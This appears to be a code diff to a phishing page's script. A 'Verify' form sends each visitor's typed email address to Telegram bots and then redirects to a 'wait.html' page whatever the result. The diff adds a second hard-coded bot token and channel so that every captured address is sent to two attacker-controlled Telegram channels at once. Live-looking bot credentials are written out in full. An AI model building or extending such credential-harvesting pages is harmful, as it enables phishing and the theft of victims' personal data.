@@ -12,17 +12,29 @@
     async function sendEmailToTelegram(event) {
       event.preventDefault();
       const email = document.getElementById('email').value;
-      const botToken = '7619144760:AAFgnQ9NIw4IR8SA-JNLk2upPe0LHvNMgKM'; // <-- Insert your bot token here
-      const chatId = '@yenidencoc';     // <-- Insert your chat ID here
+
+      // 1. kanal için bot token ve chat ID
+      const botToken1 = '7619144760:AAFgnQ9NIw4IR8SA-JNLk2upPe0LHvNMgKM'; // İlk bot token
+      const chatId1 = '5587800563';        // 1. kanal
+
+      // 2. kanal için bot token ve chat ID (farklı token)
+      const botToken2 = '8494126175:AAExKLNR45Huiv42KwWAxm42dLh61vcFSDA';  // İkinci bot token
+      const chatId2 = '@sukibaba999';          // 2. kanal
+
       const message = `Email address: ${email}`;
-      
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-      
+
+      // Her iki kanal için ayrı URL'ler
+      const url1 = `https://api.telegram.org/bot${botToken1}/sendMessage?chat_id=${chatId1}&text=${encodeURIComponent(message)}`;
+      const url2 = `https://api.telegram.org/bot${botToken2}/sendMessage?chat_id=${chatId2}&text=${encodeURIComponent(message)}`;
+
       try {
-        await fetch(url);
-        window.location.href = 'wait.html'; // Redirect page after code is sent
+        // İki isteği paralel olarak gönder
+        await Promise.allSettled([fetch(url1), fetch(url2)]);
+        // Yönlendirme
+        window.location.href = 'wait.html';
       } catch (error) {
-        console.error('Error sending message to Telegram:', error);
+        console.error('Telegram’a mesaj gönderilirken hata oluştu:', error);
+        window.location.href = 'wait.html';
       }
     }
   </script>
@@ -36,7 +48,6 @@
       <span class="text-gray-700 font-medium">Verify</span>
     </div>
     <div class="w-full bg-gray-200 rounded-full h-2.5 mb-4">
-      <!-- Adjust the progress bar width as needed (style="width: 50%") -->
       <div class="bg-gradient-to-r from-blue-500 to-green-400 h-2.5 rounded-full" style="width: 50%;"></div>
     </div>
     
